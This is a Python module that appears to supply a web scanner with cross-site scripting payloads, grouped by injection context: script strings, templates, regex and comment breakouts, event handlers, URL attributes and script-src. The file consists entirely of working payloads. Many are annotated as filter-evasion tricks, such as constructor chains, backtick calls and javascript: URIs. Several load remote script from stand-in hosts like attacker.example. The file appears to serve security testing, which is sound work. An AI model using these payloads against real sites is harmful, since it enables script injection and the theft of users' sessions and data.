# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""Script, event-handler, URL, and script-src context payloads."""

SCRIPT_STRING_D = [
    '"-alert(\'{marker}\')-"',
    '";alert(\'{marker}\');//',
    '";\nalert(\'{marker}\');\n//',
    '\\"-alert(\'{marker}\')-\\"',
    '"+alert(\'{marker}\')+\\"',
]

SCRIPT_STRING_S = [
    "'-alert('{marker}')-'",
    "';alert('{marker}');//",
    "';\nalert('{marker}');\n//",
    "\\'-alert('{marker}')-\\'",
]

SCRIPT_BARE = [
    ";alert('{marker}')//",
    "\nalert('{marker}')\n",
    "/**/;alert('{marker}')//",
    "};alert('{marker}');//",
    "]};alert('{marker}');//",
    # Indirect call — bypasses alert() keyword filters via comma operator
    ";(0,alert)('{marker}')//",
    # Tagged template call — no parentheses required
    ";alert`{marker}`//",
    # window.onerror trick — throw triggers the handler
    ";window.onerror=alert;throw'{marker}'//",
    # Constructor chain — eval-equivalent without eval keyword
    ";[].constructor.constructor('alert(\\'\\'{marker}\\'\\')')()//",
    # setTimeout with args — alert keyword not adjacent to call
    ";setTimeout(alert,0,'{marker}')//",
    # new Function — string-based eval alternative
    ";new Function('alert(\\'\\'{marker}\\'\\')') ()//",
    # Async IIFE — bypasses some synchronous execution guards
    ";(async()=>{{await alert('{marker}')}})()//",
    # throw Error — triggers without parenthesised alert
    ";throw new Error('{marker}')//",
    # void expression — alternative call wrapper
    ";void alert('{marker}')//",
    # location navigation — works even when alert is blocked
    ";location='javascript:alert(\\'\\'{marker}\\'\\')';",
]

SCRIPT_TEMPLATE = [
    "`-alert('{marker}')-`",
    "`;alert('{marker}')//`",
    "${{alert('{marker}')}}",
    "`${{alert('{marker}')}}",
    "`;alert('{marker}')//",
    # Constructor chain inside template expression
    "${[].constructor.constructor('alert(\\'\\'{marker}\\'\\')')()}",
    # Indirect call inside expression
    "${(0,alert)('{marker}')}",
    # setTimeout inside expression — bypasses alert keyword check on expression
    "${setTimeout(alert,0,'{marker}')}",
    # Nested template literal — double expression eval
    "${`${alert('{marker}')}`}",
    # Tagged template close then tag call
    "`;alert`{marker}`//",
    # location inside expression — fallback when alert is blocked
    "${location='javascript:alert(\\'\\'{marker}\\'\\')'}",
    # throw inside expression — valid in modern JS engines
    "${throw new Error('{marker}')}",
    # Promise chain — async execution
    "${Promise.resolve().then(()=>alert('{marker}'))}",
]

SCRIPT_REGEX = [
    "/;alert('{marker}')//",
    "/;alert('{marker}');var x=/",
    "/.test('');alert('{marker}');//",
    "/g;alert('{marker}');//",
    # Flags sandwich — close with multiple flags then inject
    "/gi;alert('{marker}');//",
    "/i;alert('{marker}');//",
    # Unicode flag variant
    "/u;alert('{marker}');//",
    # Named capture group close
    "/(?<x>a);alert('{marker}');//",
    # Newline in regex source — some parsers treat as terminator
    "/\\\nalert('{marker}')//",
    # throw variant — no alert parens
    "/;throw new Error('{marker}');//",
]

SCRIPT_COMMENT = [
    "*/;alert('{marker}');///*",
    "*/alert('{marker}')/*",
    "*/;alert('{marker}');var x=/*",
    "*/ alert('{marker}') /*",
    # Line comment breakout via newline (// comment terminated by newline)
    "\nalert('{marker}')//",
    "\n;alert('{marker}')//",
    # Unicode line separator — terminates // comments in old parsers
    " alert('{marker}')//",
    # Unicode paragraph separator
    " alert('{marker}')//",
    # HTML comment close in script — terminates <!-- style comments
    "-->\nalert('{marker}')\n//<!--",
    # Indirect call after block comment close
    "*/;(0,alert)('{marker}');///*",
]

EVENT_HANDLER = [
    "alert('{marker}')",
    "confirm('{marker}')",
    "(function(){{alert('{marker}')}})();",
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
    "[1].find(alert)",
    # Backtick call — no parentheses, bypasses ( and ) filters
    "alert`{marker}`",
    # Indirect call via comma operator — bypasses direct alert() detection
    "(0,alert)('{marker}')",
    # setTimeout with args — alert keyword not adjacent to invocation
    "setTimeout(alert,0,'{marker}')",
    # Constructor chain — bypasses alert/eval keyword blockers
    "[].find.constructor('alert(\\'\\'{marker}\\'\\')')() ",
    # window.onerror + throw — alert never called directly
    "window.onerror=alert;throw'{marker}'",
    # new Function — eval-equivalent without eval keyword
    "new Function('alert(\\'\\'{marker}\\'\\')')()",
    # throw Error — no function call syntax at all
    "throw new Error('{marker}')",
    # setInterval variant
    "setInterval('alert(\\'\\'{marker}\\'\\'')",
    # location navigation — works even if alert is blocked
    "location='javascript:alert(\\'\\'{marker}\\'\\')' ",
    # document.write to inject new XSS sink
    "document.write('<img src onerror=alert(\\'\\'{marker}\\'\\')>')",
    # eval variant
    "eval('alert(\\'\\'{marker}\\'\\')') ",
    # Promise chain — async execution evades synchronous sandbox
    "Promise.resolve().then(()=>alert('{marker}'))",
]

URL_ATTR = [
    "javascript:alert('{marker}')",
    "JaVaScRiPt:alert('{marker}')",
    "javascript&#58;alert('{marker}')",
    "javascript:void(alert('{marker}'))",
    "data:text/html,<script>alert('{marker}')</script>",
    "//attacker.example/xss.js?{marker}",
    # Juice Shop DOM/Reflected XSS: backtick JS URI (bypasses quote-stripping filters)
    "javascript:alert(`{marker}`)",
]

SCRIPT_SRC = [
    "//attacker.example/{marker}.js",
    "//evil.example/xss/{marker}",
    "http://attacker.example/{marker}.js",
    '"><script>alert("{marker}")</script>',
    "'><script>alert('{marker}')</script>",
]
